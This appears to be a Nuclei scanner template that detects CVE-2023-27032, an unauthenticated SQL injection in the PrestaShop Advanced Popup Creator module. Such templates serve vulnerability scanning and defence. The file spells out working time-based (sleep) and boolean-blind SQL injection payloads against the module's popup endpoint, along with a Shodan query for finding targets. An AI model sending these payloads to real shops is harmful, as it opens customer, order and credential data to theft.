flow: 'http(1) && (http(2) || http(3))

  '
http:
- extractors:
  - group: 1
    internal: true
    name: time
    regex:
    - '"time":([0-9]+),'
    type: regex
  - group: 1
    internal: true
    name: token
    regex:
    - '"static_token":"([0-9a-z]+)",'
    type: regex
  host-redirects: true
  id: extract_values
  max-redirects: 5
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- id: time_based
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body,'hasError')
    - duration >= 6
    name: time-based
    type: dsl
  raw:
  - '@timeout 20s

    POST /module/advancedpopupcreator/popup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    availablePopups=if(now()=sysdate()%2Csleep(6)%2C0)&event=1&fromController=product&getPopup=1&id_category=0&id_manufacturer=0&id_product=1&id_supplier=0&referrer=&responsiveWidth=1280&time={{time}}&token={{token}}

    '
  - '@timeout 20s

    POST /module/advancedpopupcreator/popup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    fromController=(select(0)from(select(sleep(6)))v)/*''%2B(select(0)from(select(sleep(6)))v)%2B''"%2B(select(0)from(select(sleep(6)))v)%2B"*/&id_category=0&id_cms=1&id_manufacturer=0&id_product=0&id_supplier=0&referrer=1&responsiveWidth=1280&time={{time}}&token={{token}}&updateVisits=1&url=https%253A%252F%252F{{Hostname}}%252F

    '
  stop-at-first-match: true
- id: blind_based
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(tolower(response_1), "selector")
    - '!contains(tolower(response_2), "selector")'
    name: blind-based
    type: dsl
  raw:
  - 'POST /module/advancedpopupcreator/popup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    availablePopups=-8514)%20OR%206158%3d6158--%20eKWg&event=1&fromController=product&getPopup=1&id_category=0&id_manufacturer=0&id_product=1&id_supplier=0&referrer=&responsiveWidth=1280&time={{time}}&token={{token}}

    '
  - 'POST /module/advancedpopupcreator/popup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    availablePopups=-8514)%20OR%206158%3d6157--%20eKWg&event=1&fromController=product&getPopup=1&id_category=0&id_manufacturer=0&id_product=1&id_supplier=0&referrer=&responsiveWidth=1280&time={{time}}&token={{token}}

    '
id: CVE-2023-27032
info:
  author: MaStErChO
  classification:
    cpe: cpe:2.3:a:idnovate:popup_module_\(on_entering\,_exit_popup\,_add_product\)_and_newsletter:*:*:*:*:*:prestashop:*:*
    cve-id: CVE-2023-27032
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.97586
    epss-score: 0.4769
  description: "In the module \u201CAdvanced Popup Creator\u201D (advancedpopupcreator)\
    \ from Idnovate for PrestaShop, a guest can perform SQL injection in affected\
    \ versions.\n"
  impact: 'Unauthenticated attackers can execute arbitrary SQL commands to extract
    database contents including customer data, orders, payment information, and administrative
    credentials from the PrestaShop database.

    '
  metadata:
    framework: prestashop
    max-request: 3
    product: popup_module_\(on_entering\,_exit_popup\,_add_product\)_and_newsletter
    shodan-query: http.component:"prestashop"
    vendor: idnovate
    verified: true
  name: PrestaShop AdvancedPopupCreator - SQL Injection
  reference:
  - https://security.friendsofpresta.org/modules/2023/04/11/advancedpopupcreator.html
  - https://addons.prestashop.com/en/pop-up/23773-popup-on-entry-exit-popup-add-product-and-newsletter.html
  remediation: 'Upgrade to the latest version of the Advanced Popup Creator module
    from Idnovate that addresses this SQL injection vulnerability.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2023,sqli,prestashop,advancedpopupcreator,idnovate,vuln
